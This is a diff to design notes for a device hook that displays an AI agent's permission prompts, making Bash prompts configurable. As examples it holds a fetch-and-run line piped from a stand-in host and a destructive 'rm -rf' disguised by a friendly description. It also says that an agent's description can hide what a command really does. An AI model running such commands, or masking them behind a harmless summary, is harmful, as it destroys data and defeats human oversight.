@@ -56,15 +56,42 @@ fork:      rm -rf /tmp/build && curl https://sh.example.com | bash
 
 Two related changes:
 
-- **Bash prompts show the command, not the description.** The description is
-  prose written alongside the call and can describe something other than what
-  the command does; the command is the thing actually being authorised. On a
-  security prompt, ground truth beats the summary.
 - **Details are ASCII-fitted and capped by bytes** (`_fit()` in the hook). The
   device draws single-byte glyphs into a fixed buffer, so upstream sending e.g.
   `héllo — wörld` would render as garbage and risk a cut mid-sequence.
+- **Bash prompts are configurable** via the `permissionDetail` option
+  (`description` — default, `command`, or `both`).
 
 This needs no firmware change — the device could always display it.
+
+#### Why `description` is the default
+
+Showing the raw command looks like the safer choice — a description is prose
+written alongside the call and can describe something other than what runs.
+In practice it is worse, because agent-issued commands are front-loaded with
+boilerplate, and the boilerplate is exactly what survives truncation:
+
+```
+command: cd "/Users/tonyjoy/Documents/Claude Projects/flipper-…" && gh workflow run …
+
+   |cd "/Users/tonyjoy/D|      description would be:
+   |ocuments/Claude     |      "Rebuild the FAP"
+   |Projects/flipper-   |
+```
+
+Both non-default modes strip leading `cd …&&` and `VAR=value` prefixes first,
+so `command` mode shows `gh workflow run "Build Flipper App" --ref main`
+rather than a path.
+
+`both` is worth considering as a default if you want the safety property back
+without losing readability — the description comes first so it always survives
+truncation, and the command fills whatever space remains:
+
+```
+Clean up temp files: rm -rf /important/data
+```
+
+which is precisely the case a friendly description would otherwise hide.
 
 ## 2. VS Code extension support
 
